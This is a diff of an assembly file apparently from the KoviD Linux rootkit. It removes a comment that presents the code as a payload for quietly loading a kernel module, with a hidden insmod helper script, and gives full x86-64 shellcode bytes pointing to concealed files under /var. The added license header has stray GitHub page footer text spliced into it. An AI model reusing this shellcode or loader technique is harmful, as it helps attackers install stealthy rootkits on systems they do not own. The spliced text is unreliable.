@@ -1,36 +1,36 @@
-/**
- * Linux Kernel version <= 5.8.0
- * - hash
- *
- *  KoviD rootkit
- *
- * This code is designed to serve as the payload for Volundr.
- *
- * While it can be readily customized to execute other commands,
- * its primary purpose is to load a Linux Kernel Module (LKM) quietly.
- *
- * Make sure to read this! You will need the 'loadmodule.sh' script:
- *
- * ---snip---
- * #!/bin/bash
- * /sbin/insmod $1 2>/dev/null
- * ---snip---
- *
- *  \x50\x51\x52\x56\x57\x41\x53\xb8\x39\x00\x00\x00\x0f\x05\x83\xf8\x00\x75
- *  \x31\x48\x8d\x05\xb9\x00\x00\x00\x48\x8d\x3d\xa6\x00\x00\x00\x48\x31\xd2
- *  \x52\x50\x57\x48\x89\xe6\x48\xc7\xc0\x3b\x00\x00\x00\x48\x8d\x3d\x8f\x00
- *  \x00\x00\x48\xc7\xc2\x00\x00\x00\x00\x0f\x05\x48\x31\xc0\xb8\x02\x00\x00
- *  \x00\x48\x8d\x3d\x8f\x00\x00\x00\x48\xc7\xc6\x00\x00\x00\x00\x0f\x05\x48
- *  \x83\xec\x10\x48\x89\xc7\xb8\x00\x00\x00\x00\x48\x89\xe6\x48\xc7\xc2\x11
- *  \x00\x00\x00\x0f\x05\x48\xc7\xc1\x12\x00\x00\x00\xb0\x2d\x48\x89\xe7\xfc
- *  \xf2\xae\x49\xc7\xc5\x11\x00\x00\x00\x49\x29\xcd\x4c\x89\xe9\x48\x31\xdb
- *  \x48\x89\xe6\x48\x89\xf7\xfc\xac\x3c\x39\x7e\x04\x2c\x57\xeb\x02\x2c\x30
- *  \x48\xc1\xe3\x04\x48\x09\xc3\xaa\xe2\xeb\x48\x83\xc4\x10\x49\xb8\x88\x77
- *  \x66\x55\x44\x33\x22\x11\x49\x01\xd8\x41\x5b\x5f\x5e\x5a\x59\x58\x41\xff
- *  \xe0\x2f\x76\x61\x72\x2f\x2e\x6c\x6d\x2e\x73\x68\x2f\x76\x61\x72\x2f\x2e
- *  \x6b\x76\x2e\x6b\x6f\x2f\x70\x72\x6f\x63\x2f\x73\x65\x6c\x66\x2f\x6d\x61
- *  \x70\x73
- */
+#   BSD 3-Clause License
+#
+#   Copyright (c) 2024, Carlos Carvalho
+#   All rights reserved.
+#
+#   Redistribution and use in source and binary forms, with or without
+#   modification, are permitted provided that the following conditions are met:
+#
+#   1. Redistributions of source code must retain the above copyright notice, this
+#      list of conditions and the following disclaimer.
+#
+#   2. Redistributions in binary form must reproduce the above copyright notice,
+#      this list of conditions and the following disclaimer in the documentation
+#      and/or other materials provided with the distribution.
+#
+#   3. Neither the name of the copyright holder nor the names of its
+#      contributors may be used to endorse or promote products derived from
+#      this software without specific prior written permission.
+#
+#   THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
+#   AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+#   IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
+#   DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
+#   FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
+#   DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
+#   SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
+#   CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
+#   OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
+#   OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+#   © 2022 GitHub, Inc.
+#   Terms
+#   Privacy
+#   Security
 
 .globl _start
 
